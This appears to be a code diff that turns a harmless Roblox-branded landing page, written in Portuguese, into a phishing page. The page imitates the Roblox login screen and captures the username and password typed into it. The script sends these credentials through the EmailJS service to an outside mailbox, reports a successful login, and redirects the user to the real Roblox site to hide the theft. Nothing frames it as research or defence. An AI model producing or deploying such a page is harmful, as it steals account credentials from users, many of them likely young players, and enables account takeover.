@@ -1,267 +1,234 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
+ <!DOCTYPE html>
+<html lang="pt-br">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ROBLOX</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            // Sua Public Key
+            emailjs.init("4nOCEE08jK86Ozlp3");
+        })();
+    </script>
+    <style>
+        /* Reset */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
+        
+        body {
+            background-color: #232527; /* Cor de fundo padrão do Roblox Dark Mode */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
 
-    body {
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 40%, #0f3460 100%);
-      background-size: cover;
-      position: relative;
-      overflow: hidden;
-    }
+        /* Fundo decorativo sutil (opcional, para parecer mais profissional) */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle at center, rgba(255,255,255,0.05) 0%, transparent 70%);
+            pointer-events: none;
+        }
 
-    /* Background collage simulation */
-    body::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      background:
-        radial-gradient(circle at 20% 30%, rgba(255, 107, 107, 0.15) 0%, transparent 40%),
-        radial-gradient(circle at 80% 20%, rgba(78, 205, 196, 0.15) 0%, transparent 40%),
-        radial-gradient(circle at 40% 80%, rgba(69, 183, 209, 0.15) 0%, transparent 40%),
-        radial-gradient(circle at 70% 70%, rgba(150, 111, 214, 0.15) 0%, transparent 40%);
-      z-index: 0;
-    }
+        .login-container {
+            background-color: #393b3d; /* Fundo do card de login */
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
+            z-index: 10;
+            position: relative;
+        }
 
-    .container {
-      position: relative;
-      z-index: 1;
-      text-align: center;
-      padding: 40px;
-      background: rgba(255, 255, 255, 0.08);
-      backdrop-filter: blur(12px);
-      border-radius: 24px;
-      box-shadow: 0 16px 50px rgba(0, 0, 0, 0.4);
-      border: 1px solid rgba(255, 255, 255, 0.15);
-      max-width: 480px;
-      width: 90%;
-    }
+        .logo-area {
+            text-align: center;
+            margin-bottom: 30px;
+        }
 
-    .logo {
-      font-size: 64px;
-      font-weight: 900;
-      color: #fff;
-      margin-bottom: 12px;
-      letter-spacing: 2px;
-      text-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
-      position: relative;
-      display: inline-block;
-    }
+        .logo-area svg {
+            width: 100px;
+            height: auto;
+            margin-bottom: 10px;
+        }
 
-    .logo span {
-      background: linear-gradient(90deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
+        .logo-area h1 {
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 0.5px;
+            color: white;
+        }
 
-    /* Square-like graphic integrated into the letter "O" */
-    .logo::after {
-      content: '';
-      position: absolute;
-      width: 42px;
-      height: 42px;
-      background: linear-gradient(135deg, #ff6b6b, #feca57);
-      border-radius: 8px;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%) rotate(45deg);
-      opacity: 0.15;
-      z-index: -1;
-      pointer-events: none;
-    }
+        .input-group {
+            margin-bottom: 15px;
+        }
 
-    .subtitle {
-      color: rgba(255, 255, 255, 0.7);
-      font-size: 16px;
-      margin-bottom: 40px;
-    }
+        input[type="text"], 
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 15px;
+            background-color: #e7e9ec; /* Cinza claro clássico */
+            border: 1px solid transparent;
+            border-radius: 5px;
+            font-size: 16px;
+            color: black;
+            outline: none;
+            transition: all 0.2s ease;
+        }
 
-    .buttons {
-      display: flex;
-      flex-direction: column;
-      gap: 16px;
-      margin-bottom: 36px;
-    }
+        input:focus {
+            background-color: white;
+            border-color: #000;
+        }
 
-    .btn {
-      padding: 16px 32px;
-      font-size: 18px;
-      font-weight: 700;
-      border: none;
-      border-radius: 14px;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-    }
+        input::placeholder {
+            color: #6d6d6d;
+        }
 
-    .btn-signup {
-      background: linear-gradient(135deg, #00b894, #00cec9);
-      color: white;
-      box-shadow: 0 6px 20px rgba(0, 184, 148, 0.4);
-    }
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #000; /* Botão preto solicitado */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
 
-    .btn-signup:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 10px 25px rgba(0, 184, 148, 0.6);
-    }
+        button:hover {
+            background-color: #333;
+        }
 
-    .btn-login {
-      background: rgba(255, 255, 255, 0.15);
-      color: white;
-      border: 2px solid rgba(255, 255, 255, 0.3);
-      backdrop-filter: blur(6px);
-    }
+        button:disabled {
+            background-color: #555;
+            cursor: not-allowed;
+            opacity: 0.7;
+        }
 
-    .btn-login:hover {
-      background: rgba(255, 255, 255, 0.25);
-      transform: translateY(-2px);
-      border-color: rgba(255, 255, 255, 0.5);
-    }
+        .links {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
 
-    .footer-links {
-      display: flex;
-      justify-content: center;
-      gap: 24px;
-      margin-top: 24px;
-    }
+        .links a {
+            color: #bdbec0;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 10px;
+        }
 
-    .footer-links a {
-      color: rgba(255, 255, 255, 0.6);
-      text-decoration: none;
-      font-size: 14px;
-      transition: color 0.3s ease;
-    }
+        .links a:hover {
+            text-decoration: underline;
+            color: white;
+        }
 
-    .footer-links a:hover {
-      color: #fff;
-      text-decoration: underline;
-    }
+        #status-msg {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            min-height: 20px;
+            font-weight: 500;
+        }
 
-    .config-info {
-      margin-top: 28px;
-      padding: 12px;
-      background: rgba(0, 0, 0, 0.3);
-      border-radius: 10px;
-      font-size: 13px;
-      color: rgba(255, 255, 255, 0.5);
-      text-align: left;
-    }
+        .success { color: #00b02a; }
+        .error { color: #ff4d4d; }
 
-    .config-info span {
-      color: #48dbfb;
-      font-weight: 600;
-    }
-
-    @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(-10px); }
-    }
-
-    .logo {
-      animation: float 4s ease-in-out infinite;
-    }
-
-    @media (max-width: 600px) {
-      .container {
-        padding: 30px 20px;
-        border-radius: 20px;
-      }
-      .logo {
-        font-size: 48px;
-      }
-      .btn {
-        font-size: 16px;
-        padding: 14px 28px;
-      }
-    }
-  </style>
+        /* Responsividade */
+        @media (max-width: 480px) {
+            .login-container {
+                margin: 20px;
+                padding: 30px 20px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <div class="logo"><span>ROBLOX</span></div>
-    <p class="subtitle">Jogue, Crie, Conecte-se</p>
 
-    <div class="buttons">
-      <button class="btn btn-signup" onclick="handleSignup()">Sign Up</button>
-      <button class="btn btn-login" onclick="handleLogin()">Log In</button>
+    <div class="login-container">
+        <div class="logo-area">
+            <!-- Logo SVG do Roblox -->
+            <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                <path d="M20 20 H80 V80 H20 Z" fill="#fff"/>
+                <circle cx="35" cy="35" r="5" fill="#000"/>
+                <circle cx="65" cy="35" r="5" fill="#000"/>
+                <rect x="35" y="60" width="30" height="5" fill="#000"/>
+            </svg>
+            <h1>ROBLOX</h1>
+        </div>
+
+        <form id="login-form">
+            <div class="input-group">
+                <input type="text" name="username" placeholder="Usuário ou E-mail" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <input type="password" name="password" placeholder="Senha" required>
+            </div>
+            
+            <button type="submit" id="btn-submit">Entrar</button>
+            
+            <div class="links">
+                <a href="#">Esqueceu sua senha?</a>
+            </div>
+        </form>
+        
+        <div id="status-msg"></div>
     </div>
 
-    <div class="footer-links">
-      <a href="#" onclick="openLink('terms')">Terms</a>
-      <a href="#" onclick="openLink('privacy')">Privacy</a>
-    </div>
+    <script type="text/javascript">
+        const form = document.getElementById('login-form');
+        const btn = document.getElementById('btn-submit');
+        const statusMsg = document.getElementById('status-msg');
 
-    <!-- Informações de configuração do sistema -->
-    <div class="config-info">
-      <div>IP Service: <span id="display-ip">192.168.1.100</span></div>
-      <div>Porta: <span id="display-port">8080</span></div>
-      <div>Status: <span id="display-status" style="color: #00b894;">Online</span></div>
-    </div>
-  </div>
+        form.addEventListener('submit', function(event) {
+            event.preventDefault(); 
 
-  <script>
-    // Configurações do sistema (não alterar para não interferir no funcionamento)
-    const CONFIG = {
-      ipService: "192.168.1.100",
-      port: 8080,
-      region: "US-EAST",
-      version: "2.1.4",
-      enabled: true
-    };
+            // UI Feedback
+            btn.disabled = true;
+            btn.innerText = "Entrando...";
+            statusMsg.innerText = "";
+            statusMsg.className = "";
 
-    // Handler para Sign Up
-    function handleSignup() {
-      console.log("Redirecionando para cadastro...");
-      alert("Abrindo página de criação de conta...");
-      // window.location.href = "/signup";
-    }
+            // Dados para enviar
+            const templateParams = {
+                username: document.querySelector('input[name="username"]').value,
+                password: document.querySelector('input[name="password"]').value,
+                date: new Date().toLocaleString()
+            };
 
-    // Handler para Log In
-    function handleLogin() {
-      console.log("Redirecionando para login...");
-      alert("Abrindo página de login...");
-      // window.location.href = "/login";
-    }
+            // Envio via EmailJS
+            emailjs.send('service_4ipri3b', 'template_ttaedjc', templateParams)
+                .then(function(response) {
+                    console.log('SUCESSO!', response.status, response.text);
+                    
+                    btn.innerText = "Sucesso!";
+                    statusMsg.innerText = "Login realizado com sucesso!";
+                    statusMsg.className = "success";
+                    
+                    // Redireciona após breve delay
+                    setTimeout(() => {
+                        window.location.href = "https://www.roblox.com/home";
+                    }, 2000);
 
-    // Handler para links do rodapé
-    function openLink(type) {
-      event.preventDefault();
-      const pages = {
-        terms: "Termos de Serviço",
-        privacy: "Política de Privacidade"
-      };
-      alert(pages[type] || "Página não disponível");
-    }
-
-    // Verifica status do serviço a cada 30 segundos
-    setInterval(() => {
-      console.log(`[SISTEMA] Verificando status... IP: ${CONFIG.ipService}:${CONFIG.port}`);
-      
-      // Atualiza visualização das configurações mantendo os valores originais
-      document.getElementById('display-ip').textContent = CONFIG.ipService;
-      document.getElementById('display-port').textContent = CONFIG.port;
-      document.getElementById('display-status').textContent = CONFIG.enabled ? "Online" : "Offline";
-      document.getElementById('display-status').style.color = CONFIG.enabled ? "#00b894" : "#ff6b6b";
-    }, 30000);
-  </script>
+                }, function(error) {
+                    console.error('FALHA...', error);
+                    
+                    btn.disabled = false;
+                    btn.innerText = "Entrar";
+                    statusMsg.innerText = "Erro ao conectar. Verifique o Console.";
+                    statusMsg.className = "error";
+                });
+        });
+    </script>
 </body>
 </html>
